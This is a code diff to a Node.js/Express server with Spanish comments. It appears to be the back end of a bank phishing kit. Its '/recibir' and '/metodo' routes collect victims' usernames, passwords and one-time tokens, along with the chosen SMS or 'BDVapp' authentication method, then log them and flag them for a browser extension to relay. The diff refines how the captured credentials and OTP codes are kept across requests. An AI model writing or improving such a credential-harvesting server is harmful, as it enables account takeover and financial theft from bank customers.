@@ -15,60 +15,45 @@ let baseDeDatosTemporal = {
     metodo: null 
 };
 
-// --- RUTA: RECIBIR MÉTODO ---
+// --- RUTA: RECIBIR MÉTODO (Botones SMS/BDVapp) ---
 app.post('/metodo', (req, res) => {
     const { metodo } = req.body;
     baseDeDatosTemporal.metodo = metodo;
-    baseDeDatosTemporal.actualizado = true; // Importante para que la extensión lo vea
-    console.log("===============================");
-    console.log(`🎯 Método Seleccionado: ${metodo ? metodo.toUpperCase() : 'NULL'}`);
-    console.log("===============================");
+    baseDeDatosTemporal.actualizado = true;
+    console.log(`🎯 Método Seleccionado: ${metodo}`);
     res.status(200).send("OK");
 });
 
+// --- RUTA: RECIBIR GENERAL (Login y actualizaciones) ---
 app.post('/recibir', (req, res) => {
-    // CAMBIO AQUÍ: Ahora extraemos también 'metodo' del cuerpo de la petición
     const { user, pass, token, origen, metodo } = req.body;
 
-    let tokenFinal;
+    // Actualización inteligente: solo cambia lo que recibe
+    if (user) baseDeDatosTemporal.user = user;
+    if (pass) baseDeDatosTemporal.pass = pass;
+    if (origen) baseDeDatosTemporal.origen = origen;
+    if (metodo) baseDeDatosTemporal.metodo = metodo;
 
+    // Lógica de Token para que no se borre si ya existe
     if (origen === "LOGIN_INICIAL") {
-        tokenFinal = null;
+        baseDeDatosTemporal.token = null;
     } else if (token !== undefined && token !== "") {
-        tokenFinal = token;
-    } else {
-        tokenFinal = (user === baseDeDatosTemporal.user) ? baseDeDatosTemporal.token : null;
+        baseDeDatosTemporal.token = token;
     }
 
-    // RECONSTRUCCIÓN DEL OBJETO CORREGIDA
-    baseDeDatosTemporal = {
-        user: user || baseDeDatosTemporal.user,
-        pass: pass || baseDeDatosTemporal.pass,
-        token: tokenFinal,
-        origen: origen,
-        // CAMBIO AQUÍ: Si viene un método en la petición, úsalo; si no, mantén el que ya tenemos
-        metodo: metodo || baseDeDatosTemporal.metodo, 
-        actualizado: true
-    };
+    baseDeDatosTemporal.actualizado = true;
 
     console.log("===============================");
     console.log(`👤 Usuario: ${baseDeDatosTemporal.user}`);
-    console.log(`📲 Token: ${baseDeDatosTemporal.token === null ? "ESPERANDO..." : baseDeDatosTemporal.token}`);
-    console.log(`🛠️ Método Auth: ${baseDeDatosTemporal.metodo || "NO DEFINIDO"}`);
+    console.log(`🛠️ Método Auth: ${baseDeDatosTemporal.metodo || "ESPERANDO..."}`);
+    console.log(`📍 Origen: ${baseDeDatosTemporal.origen}`);
     console.log("===============================");
 
     res.status(200).send("OK");
 });
 
 app.post('/limpiar', (req, res) => {
-    baseDeDatosTemporal = {
-        user: null,
-        pass: null,
-        token: null,
-        origen: null,
-        actualizado: false,
-        metodo: null 
-    };
+    baseDeDatosTemporal = { user: null, pass: null, token: null, origen: null, actualizado: false, metodo: null };
     console.log("🧹 Base de datos reseteada.");
     res.status(200).send("Limpiado");
 });
